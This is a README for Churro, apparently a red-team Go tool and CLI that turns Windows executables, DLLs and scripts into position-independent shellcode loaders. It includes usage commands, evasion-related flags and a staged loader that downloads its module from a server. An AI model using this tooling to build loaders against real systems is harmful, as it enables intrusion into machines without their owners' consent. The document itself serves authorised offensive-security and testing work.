# Churro

Churro converts a 64-bit Windows PE or script into a position-independent
shellcode buffer. It is an importable Go package and a standalone CLI. It
ports Fritter's host-side generator to Go and keeps the typed payload boundary
used by [Fritter's Go API](https://github.com/sliverarmory/Fritter).

The generator and CLI are Go code and do not use cgo. Like
[Malasada](https://github.com/sliverarmory/malasada) and
[Beignet](https://github.com/sliverarmory/beignet), Churro embeds checked-in
native loader blobs. The current blobs came from Fritter's MinGW build at
[`ff952a22`](https://github.com/sliverarmory/Fritter/commit/ff952a22b1cf06d41b3781ab7c20f608b9754e53)
and execute as native code inside a Windows process. Go consumers do not need
a C compiler, Zig, WebAssembly, or a sidecar executable.

## Build

Go 1.24 or newer is required. From this directory:

```sh
make build
make test
```

The checked-in loader blobs are build inputs. Churro does not yet provide a
reproducible blob regeneration command. Changes to the native loader currently
require rebuilding those assets in Fritter. Zig is a possible compiler for a
future in-repo regeneration path, but is not used by this build.

The generated CLI accepts Windows x64 `.exe` and `.dll` images, plus `.vbs`
and `.js` source. Native and managed PE inputs are selected from the PE
headers. A native DLL's `DllMain` runs, followed by the named parameterless
export when `-method` is set.

```sh
./churro-gen -input payload.dll -method StartW -output payload.bin
./churro-gen -input payload.exe -output executable.bin
./churro-gen -input assembly.dll -class Example.Entry -method Run -output managed.bin
```

On Windows, use `churro-gen.exe`. Use `-format` to select `bin` (the default),
`base64`, `c`, `ruby`, `python`, `powershell`, `csharp`, `hex`, or `uuid`. The
`-exit`, `-entropy`, `-headers`, `-decoy`, and `-thread` flags expose the shared
loader and native PE options. Run `churro-gen -h` for their accepted values.

To produce a loader that downloads its module, supply a base URL. The CLI
writes the opaque staged module beside the loader using its generated name, or
to the path selected by `-module-output`. Host that module at the URL formed
from `-server` and its module name; the CLI does not upload it.

```sh
./churro-gen -input payload.dll -method StartW \
    -server https://example.test/modules/ -modname PAYLOAD \
    -output loader.bin -module-output PAYLOAD
```

## Go API

`Generate` accepts payload bytes and returns the loader bytes. It does not
read or write host files. The zero-valued format returns raw shellcode bytes.

```go
result, err := churro.Generate(ctx, churro.Request{
    Payload: churro.NativeDLL{
        Image: dll,
        Export: &churro.NativeDLLExport{Name: "StartW"},
    },
})
if err != nil {
    return err
}
loader := result.Loader
_ = loader
```

The package also has typed `NativeExecutable`, `DotNetExecutable`,
`DotNetDLL`, `VBScript`, and `JScript` requests. Native DLL exports and managed
DLL methods must be parameterless. The API does not expose target argv or raw
command-line arguments. `Format` controls the representation of
`Result.Loader`; `FormatBinary` is the zero-value default.

## Current implementation scope

The embedded MinGW loader currently uses one dispatch region for the whole
loader and fixed constants in its native build. Churro still randomizes the
instance and outer and dispatch keys for each output. Its current Go decoder,
stack alignment, and trampoline instruction forms are simpler than Fritter's
per-output polymorphic forms. This is a functional generator port, not full
polymorphic parity with a newly built Fritter binary.

## Verification

`go test ./...` checks request validation, blob generation, and output
formats. Native shellcode execution requires a Windows x64 host. On Windows,
`scripts/test-windows-e2e.ps1` builds native and Go test DLLs, executes
generated loaders, and checks their marker files. GitHub Actions runs that
harness on a Windows runner.
